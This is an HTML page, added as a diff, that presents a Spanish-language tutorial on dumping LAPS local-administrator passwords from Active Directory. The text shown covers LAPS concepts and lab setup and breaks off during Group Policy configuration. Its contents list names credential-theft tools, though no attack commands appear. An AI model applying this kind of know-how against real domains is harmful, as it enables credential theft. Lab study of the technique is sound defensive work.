@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Volcado de Credenciales LAPS</title>
+    <style>
+        body {
+            font-family: 'Times New Roman', serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 30px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e6e6e6;
+            font-size: 16px;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: linear-gradient(145deg, #0f0f23 0%, #1a1a2e 100%);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 1px solid #2a2a4e;
+        }
+        h1 {
+            color: #ffffff;
+            font-size: 2.5em;
+            text-align: center;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+            border-bottom: 3px solid #4a4a7a;
+            padding-bottom: 15px;
+        }
+        h2 {
+            color: #b8c5d1;
+            font-size: 1.8em;
+            margin-top: 35px;
+            margin-bottom: 20px;
+            border-left: 5px solid #5a67d8;
+            padding-left: 15px;
+            font-weight: bold;
+        }
+        h3 {
+            color: #a0aec0;
+            font-size: 1.4em;
+            margin-top: 25px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        p {
+            margin-bottom: 20px;
+            text-align: justify;
+            color: #d1d5db;
+        }
+        pre {
+            background: linear-gradient(145deg, #2d3748 0%, #1a202c 100%);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            border: 1px solid #4a5568;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.5;
+            margin: 20px 0;
+        }
+        code {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #4a5568;
+        }
+        .page-number {
+            text-align: center;
+            font-size: 0.9em;
+            color: #718096;
+            margin: 30px 0;
+            font-weight: bold;
+            border-top: 1px solid #4a5568;
+            padding-top: 15px;
+        }
+        ul, ol {
+            margin-bottom: 20px;
+            padding-left: 30px;
+        }
+        li {
+            margin-bottom: 10px;
+            color: #cbd5e0;
+        }
+        strong {
+            color: #ffffff;
+            font-weight: bold;
+        }
+        hr {
+            border: none;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #5a67d8, transparent);
+            margin: 40px 0;
+        }
+        .academic-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 20px;
+            background: linear-gradient(145deg, #2a2a4e 0%, #1e1e3e 100%);
+            border-radius: 8px;
+            border: 1px solid #4a4a7a;
+        }
+        .academic-header h1 {
+            margin: 0;
+            font-size: 2.8em;
+        }
+        .section-divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #718096, transparent);
+            margin: 30px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="academic-header">
+            <h1>Volcado de Credenciales LAPS</h1>
+            <p style="font-style: italic; color: #a0aec0; margin-top: 10px;">Análisis Técnico y Metodología de Explotación</p>
+        </div>
+        
+        <div class="page-number">1 | Página</div>
+        
+        <h2>Índice de Contenidos</h2>
+        <div style="background: linear-gradient(145deg, #2a2a4e 0%, #1e1e3e 100%); padding: 20px; border-radius: 8px; margin: 20px 0; font-family: 'Courier New', monospace; font-size: 14px;">
+            <div style="display: table; width: 100%;">
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#introduccion" style="color: #b8c5d1; text-decoration: none;">Introducción</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">3</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#introduccion-laps" style="color: #b8c5d1; text-decoration: none;">Introducción a LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">3</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#beneficios-laps" style="color: #b8c5d1; text-decoration: none;">Beneficios Clave de LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">3</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#laps-mejora-seguridad" style="color: #b8c5d1; text-decoration: none;">Cómo LAPS Mejora la Seguridad</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">4</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#implementacion-laps" style="color: #b8c5d1; text-decoration: none;">Implementación y Gestión de LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">4</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#funcionamiento-laps" style="color: #b8c5d1; text-decoration: none;">Funcionamiento de LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">4</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#tipos-laps" style="color: #b8c5d1; text-decoration: none;">Tipos de LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">4</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#laps-legacy" style="color: #b8c5d1; text-decoration: none;">Microsoft LAPS Legacy (MS LAPS)</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">4</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#laps-windows" style="color: #b8c5d1; text-decoration: none;">Nuevo Windows LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">4</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#prerequisitos" style="color: #b8c5d1; text-decoration: none;">Pre-requisitos</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">4</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#configuracion-laboratorio" style="color: #b8c5d1; text-decoration: none;">Configuración del Laboratorio</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">5</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#entorno-ad" style="color: #b8c5d1; text-decoration: none;">Crear el Entorno AD</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">5</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#controlador-dominio" style="color: #b8c5d1; text-decoration: none;">Controlador de Dominio</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">5</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#crear-ou" style="color: #b8c5d1; text-decoration: none;">Crear una Unidad Organizativa</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">5</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#descargar-instalar-laps" style="color: #b8c5d1; text-decoration: none;">Descargar e Instalar LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">6</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#descargar-laps" style="color: #b8c5d1; text-decoration: none;">Descargar LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">7</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#instalar-laps-dc" style="color: #b8c5d1; text-decoration: none;">Instalar LAPS en el DC</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">7</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#configurar-gpo-laps" style="color: #b8c5d1; text-decoration: none;">Configurar Directiva de Grupo</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">7</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#extender-esquema-ad" style="color: #b8c5d1; text-decoration: none;">Extender el Esquema de AD</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">12</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#permisos-ad" style="color: #b8c5d1; text-decoration: none;">Establecer Permisos de AD</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">12</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#desplegar-laps-clientes" style="color: #b8c5d1; text-decoration: none;">Desplegar LAPS en Clientes</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">13</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#probar-laps" style="color: #b8c5d1; text-decoration: none;">Probar LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">14</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#modelo-seguridad-laps" style="color: #b8c5d1; text-decoration: none;">Modelo de Seguridad LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">15</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#usuario-dominio-allextendedrights" style="color: #b8c5d1; text-decoration: none;">Usuario Dominio AllExtendedRights</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">15</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#explicacion-allextendedrights" style="color: #b8c5d1; text-decoration: none;">Explicación AllExtendedRights</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">19</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#fase-explotacion" style="color: #b8c5d1; text-decoration: none;">Fase de Explotación</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">20</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#bloodhound-permisos" style="color: #b8c5d1; text-decoration: none;">BloodHound Permisos</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">20</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#explicacion-bloodhound" style="color: #b8c5d1; text-decoration: none;">Explicación BloodHound</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">20</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#metodo-explotacion-t1003" style="color: #b8c5d1; text-decoration: none;">Método Explotación T1003</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">22</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#impacket" style="color: #b8c5d1; text-decoration: none;">Impacket</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">22</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#herramienta-nxc" style="color: #b8c5d1; text-decoration: none;">Herramienta NXC</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">23</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#pylaps" style="color: #b8c5d1; text-decoration: none;">PyLaps</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">23</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#lapsdumper" style="color: #b8c5d1; text-decoration: none;">LAPSDumper</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">24</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#bloodyad" style="color: #b8c5d1; text-decoration: none;">BloodyAD</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">25</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#ldapsearch" style="color: #b8c5d1; text-decoration: none;">Ldapsearch</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">25</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#metasploit-ldap-query" style="color: #b8c5d1; text-decoration: none;">Metasploit ldap_query</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">25</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#impacket-ntlmrelayx" style="color: #b8c5d1; text-decoration: none;">Impacket ntlmrelayx</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">26</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#ldap-shell" style="color: #b8c5d1; text-decoration: none;">ldap_shell</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">28</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#explotacion-windows" style="color: #b8c5d1; text-decoration: none;">Explotación Windows</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">29</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#powershell" style="color: #b8c5d1; text-decoration: none;">PowerShell</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">29</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#nettools" style="color: #b8c5d1; text-decoration: none;">NetTools</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">29</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#sharplaps" style="color: #b8c5d1; text-decoration: none;">Sharplaps</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">31</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#metasploit-enum-laps" style="color: #b8c5d1; text-decoration: none;">Metasploit enum_laps</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">32</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#powerview" style="color: #b8c5d1; text-decoration: none;">Powerview</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">32</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#explorador-ad-sysinternals" style="color: #b8c5d1; text-decoration: none;">Explorador AD Sysinternals</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">33</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#conclusion" style="color: #b8c5d1; text-decoration: none;">Conclusión</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">34</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#mejores-practicas-laps" style="color: #b8c5d1; text-decoration: none;">Mejores Prácticas LAPS</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">34</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#resumen-puntos-clave" style="color: #b8c5d1; text-decoration: none;">Resumen Puntos Clave</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">35</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong><a href="#notas" style="color: #b8c5d1; text-decoration: none;">Notas</a></strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">35</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="page-number">2 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <div style="background: linear-gradient(145deg, #2a2a4e 0%, #1e1e3e 100%); padding: 20px; border-radius: 8px; margin: 20px 0; font-family: 'Courier New', monospace; font-size: 14px;">
+            <div style="display: table; width: 100%;">
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Metasploit ldap_query</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">25</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Impacket ntlmrelayx</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">26</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>ldap_shell</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">28</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Explotación Windows</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">29</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>PowerShell</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">29</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>NetTools</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">29</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Sharplaps</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">31</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Metasploit enum_laps</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">32</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Powerview</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">32</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Explorador AD Sysinternals</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">33</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Conclusión</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">34</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Mejores Prácticas LAPS</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">34</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Resumen Puntos Clave</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">35</span></div>
+                </div>
+                <div style="display: table-row;">
+                    <div style="display: table-cell; padding: 2px 0;"><strong>Notas</strong></div>
+                    <div style="display: table-cell; text-align: right; padding: 2px 0;"><span style="color: #718096;">35</span></div>
+                </div>
+            </div>
+        </div>
+
+        <hr>
+
+        <h2 id="introduccion">Introducción</h2>
+        <p>En este artículo, discutiremos el concepto de Volcado de Credenciales y LAPS (Solución de Contraseñas de Administrador Local). Profundizaremos en el mundo de la gestión de contraseñas y exploraremos cómo LAPS puede ayudar a mitigar los riesgos asociados con el uso de cuentas y contraseñas locales compartidas en un dominio. Con la creciente amenaza de ciberataques, es esencial comprender la importancia de la gestión segura de contraseñas y cómo LAPS puede ayudar a agilizar este proceso.</p>
+
+        <h2 id="introduccion-laps">Introducción a LAPS</h2>
+        <p>La Solución de Contraseñas de Administrador Local (LAPS) es una herramienta diseñada para gestionar las contraseñas de cuentas locales de computadoras unidas a un dominio. Almacena estas contraseñas de forma segura en <strong>Active Directory (AD)</strong> y las protege mediante <strong>Listas de Control de Acceso (ACLs)</strong>. En consecuencia, solo los usuarios autorizados pueden acceder o restablecerlas.</p>
+
+        <h3 id="beneficios-laps">Beneficios Clave de LAPS</h3>
+        <p>En configuraciones donde los usuarios deben iniciar sesión en computadoras sin credenciales de dominio, la gestión de contraseñas puede volverse desafiante y aumentar el riesgo de ataques de Pass-the-Hash (PtH). Por lo tanto, <strong>LAPS</strong> aborda el problema de usar una <strong>cuenta local</strong> compartida con la misma contraseña en todas las <strong>computadoras de un dominio</strong>. Asigna una contraseña única y generada aleatoriamente a la <strong>cuenta de administrador local</strong> en cada máquina. Como resultado, los <strong>administradores de dominio</strong> pueden controlar qué usuarios, como el personal de soporte técnico, pueden ver estas contraseñas.</p>
+
+        <div class="page-number">3 | Página</div>
+
+        <h2 id="laps-mejora-seguridad">Cómo LAPS Mejora la Seguridad</h2>
+        <p><strong>LAPS</strong> agiliza la gestión de contraseñas mientras refuerza las defensas contra amenazas cibernéticas. Específicamente, reduce el riesgo de <strong>movimiento lateral</strong> dentro de una red, una vulnerabilidad que surge cuando se utilizan las mismas credenciales administrativas locales en múltiples computadoras. Almacena las contraseñas de la <strong>cuenta de administrador local</strong> de cada computadora en <strong>Active Directory</strong> dentro de un atributo confidencial vinculado al objeto de AD de la computadora. Además, las computadoras actualizan su información de contraseña en AD, y los <strong>administradores de dominio</strong> asignan permisos de lectura a usuarios o grupos específicos, como equipos de soporte técnico.</p>
+
+        <h2 id="implementacion-laps">Implementación y Gestión de LAPS</h2>
+        <p>Con LAPS, las contraseñas de administrador local en computadoras unidas a dominio se gestionan automáticamente, asegurando que sean únicas, creadas aleatoriamente y almacenadas de forma segura en Active Directory. Dado que está construido completamente en <strong>infraestructura de AD</strong>, <strong>LAPS</strong> no requiere tecnologías adicionales. Además, depende de una <strong>extensión del lado del cliente de Directiva de Grupo (CSE)</strong> instalada en las computadoras gestionadas para manejar todas las tareas, e incluye herramientas de gestión que simplifican la configuración y supervisión.</p>
+
+        <h2 id="funcionamiento-laps">Funcionamiento de LAPS</h2>
+        <p>En esencia, LAPS utiliza una extensión del lado del cliente de Directiva de Grupo (CSE) que realiza funciones clave durante una actualización de Directiva de Grupo. Primero, verifica si la <strong>contraseña de la cuenta de Administrador local</strong> ha expirado. Si ha expirado o necesita cambiar de forma preventiva, la CSE genera inmediatamente una nueva contraseña y asegura que cumpla con la <strong>política de contraseñas</strong>. Luego, la CSE actualiza <strong>Active Directory</strong> con la nueva contraseña, la almacena como un <strong>atributo confidencial</strong> vinculado a la cuenta de la computadora y registra la próxima fecha de expiración de la contraseña en un atributo separado. Adicionalmente, actualiza la <strong>contraseña de la cuenta de Administrador</strong> en la computadora. Finalmente, los usuarios autorizados pueden recuperar la contraseña de <strong>Active Directory</strong> o solicitar un restablecimiento de contraseña para una máquina específica según sea necesario.</p>
+
+        <h2 id="tipos-laps">Tipos de LAPS</h2>
+        <h3 id="laps-legacy">Microsoft LAPS Legacy (MS LAPS)</h3>
+        <ul>
+            <li>Primero, Microsoft LAPS Legacy requiere una extensión de esquema de Active Directory (ms-MCS-AdmPwd) para operar.</li>
+            <li>Además, los administradores deben instalar un MSI por separado en todas las máquinas cliente.</li>
+            <li>Se puede gestionar mediante PowerShell, Objetos de Directiva de Grupo (GPO) y la interfaz de usuario de LAPS.</li>
+        </ul>
+
+        <h3 id="laps-windows">Nuevo Windows LAPS (Integrado en Windows 10/11 y Server 2019/2022)</h3>
+        <ul>
+            <li>En contraste, el nuevo Windows LAPS está integrado en Windows, por lo que no requiere una instalación separada.</li>
+            <li>Almacena de forma segura las contraseñas de administrador local en Active Directory (AD) o Azure AD.</li>
+            <li>Además, admite el cifrado de contraseñas para una seguridad mejorada.</li>
+            <li>Los administradores pueden gestionarlo mediante PowerShell, GPO y Microsoft Intune.</li>
+        </ul>
+
+        <h3 id="prerequisitos">Pre-requisitos</h3>
+        <ul>
+            <li><strong>SO</strong>: Windows Server 2019 (unido a dominio; LAPS legacy funciona desde Server 2003 SP1+).</li>
+            <li><strong>Software</strong>: .NET Framework 4.0+, PowerShell 2.0+ (ambos incluidos por defecto en Server 2019).</li>
+            <li><strong>AD</strong>: Derechos de Administrador de Esquema para actualizaciones, dominio de AD funcional.</li>
+            <li><strong>Permisos</strong>: Derechos de administrador local para la instalación, Administradores de Dominio para la configuración de AD.</li>
+        </ul>
+
+        <div class="page-number">4 | Página</div>
+
+        <h2 id="configuracion-laboratorio">Configuración del Laboratorio</h2>
+        <p><strong>Crear el Entorno AD:</strong><br>
+        Para simular un entorno de Active Directory, necesitará un Windows Server como Controlador de Dominio (DC) y una máquina cliente (Windows o Linux) donde pueda ejecutar herramientas de enumeración y explotación.</p>
+
+        <h3 id="controlador-dominio">Controlador de Dominio:</h3>
+        <ul>
+            <li>Instalar Windows Server (se recomienda 2016 o 2019).</li>
+            <li>Promoverlo a Controlador de Dominio agregando <strong>Servicios de Dominio de Active Directory</strong>.</li>
+            <li>Configurar el dominio (por ejemplo, local).</li>
+        </ul>
+
+        <h3 id="crear-ou">Crear una Unidad Organizativa</h3>
+        <p>Las unidades organizativas (OU) en un dominio gestionado por Servicios de Dominio de Active Directory (AD DS) permiten agrupar lógicamente objetos como cuentas de usuario, cuentas de servicio o cuentas de computadora. Luego puede asignar administradores a OU específicas y aplicar directivas de grupo para imponer configuraciones específicas.</p>
+
+        <p><strong>Abrir Usuarios y Equipos de Active Directory (ADUC) en el Controlador de Dominio.</strong></p>
+        <p>Haga clic derecho en <strong>Dominio (Ignite.local)</strong> y haga clic en <strong>Nuevo</strong>, y luego haga clic en <strong>Unidad Organizativa</strong>.</p>
+        <p>Asigne el nombre de la OU como <strong>Tech</strong>.</p>
+
+        <div class="page-number">5 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <h3>Nuevo Objeto - Unidad Organizativa</h3>
+        <p>Crear en: ignite.local/</p>
+        <p><strong>Nombre:</strong><br>
+        - Tech<br>
+        - Proteger contenedor de eliminación accidental</p>
+        <p><strong>OK</strong>  <strong>Cancelar</strong>  <strong>Ayuda</strong></p>
+
+        <p>Agregue su máquina cliente a la OU Tech.</p>
+        <p>En <strong>Usuarios y Equipos de Active Directory</strong>, bajo la OU Tech, debería ver su máquina cliente listada.</p>
+
+        <h3 id="descargar-instalar-laps">Descargar e Instalar LAPS</h3>
+        <p>Antes de comenzar con la fase de volcado de credenciales, necesitamos configurar LAPS en nuestro Windows Server 2016 o máquina Windows 10. Necesitamos realizar 3 tareas específicas que incluyen la instalación del cliente completo de LAPS, la configuración del Módulo de PowerShell y la implementación de plantillas de Directiva de Grupo.</p>
+
+        <div class="page-number">6 | Página</div>
+
+        <h2 id="descargar-laps">Descargar LAPS</h2>
+        <p>Obtenga la última versión de LAPS desde el Centro de Descargas de Microsoft.</p>
+
+        <h2 id="instalar-laps-dc">Instalar LAPS en el DC</h2>
+        <p>Ejecute el instalador .msi y seleccione:</p>
+        <ul>
+            <li><strong>Herramientas de Gestión</strong> (para la interfaz de usuario de LAPS)</li>
+            <li><strong>Plantillas de Directiva de Grupo</strong> (para configurar LAPS mediante GPO)</li>
+            <li><strong>Módulo de PowerShell</strong> (para gestión desde línea de comandos)</li>
+        </ul>
+        <p>Complete la instalación.</p>
+
+        <h2 id="configurar-gpo-laps">Configurar Directiva de Grupo para LAPS</h2>
+        <p>Abra la Consola de Gestión de Directivas de Grupo (GPMC).</p>
+        <p>Cree un nuevo GPO o edite uno existente.</p>
+
+        <div class="page-number">7 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <p>Navegue a: Configuración de Equipo → Plantillas Administrativas → LAPS.</p>
+        <p>Configure las siguientes configuraciones (captura de pantalla a continuación):<br>
